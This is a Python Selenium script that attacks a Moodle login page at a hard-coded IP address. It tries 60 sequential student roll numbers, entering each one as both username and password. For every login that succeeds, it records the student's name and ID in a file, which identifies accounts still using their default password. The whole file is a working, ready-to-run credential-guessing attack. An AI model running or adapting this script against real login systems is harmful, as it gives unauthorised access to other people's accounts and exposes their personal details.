from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support.expected_conditions import presence_of_element_located
import time


def single_digit(num):
    count = 0
    while num != 0:
        count += 1
        num = num // 10
    if count == 1:
        return True
    return False


def open_connection():
    driver = None
    try:
        driver = webdriver.Firefox()
    except Exception as ex:
        print(ex)
    return driver


def send_request(driver, request_url):
    try:
        driver.get(request_url)
    except Exception as ex:
        print(ex)


def get_id(roll_no_template, num):
    sid = roll_no_template
    if single_digit(num) is True:
        sid += '0' + str(num)
    else:
        sid += str(num)
    return sid


def check_password_change(driver, request_url):
    url = driver.current_url
    if url != request_url:
        name = driver.find_element_by_tag_name("header").find_element_by_tag_name("h1").text
        logout_btn = driver.find_element_by_xpath("//a[@data-title='logout,moodle']")
        logout_id = logout_btn.get_attribute('href')
        driver.get(logout_id)
        return False, name, id
    return True,None,None


def main():
    roll_no_template = '0101it1610'
    driver = open_connection()
    request_url = "http://35.193.60.139/it/login/index.php"
    with open('source.txt', 'w', encoding='utf-8') as file:
        for i in range(1, 61):
            send_request(driver, request_url)
            username = driver.find_element_by_id('username')
            password = driver.find_element_by_id('password')
            btn = driver.find_element_by_id('loginbtn')
            username.clear()
            password.clear()
            id = get_id(roll_no_template, i)
            username.send_keys(id)
            password.send_keys(id)
            btn.click()
            pwd_changed, name, pwd = check_password_change(driver,request_url)
            if pwd_changed is False:
                file.write(name + "   " + id + "\n")
        driver.close()


if __name__ == '__main__':
    main()
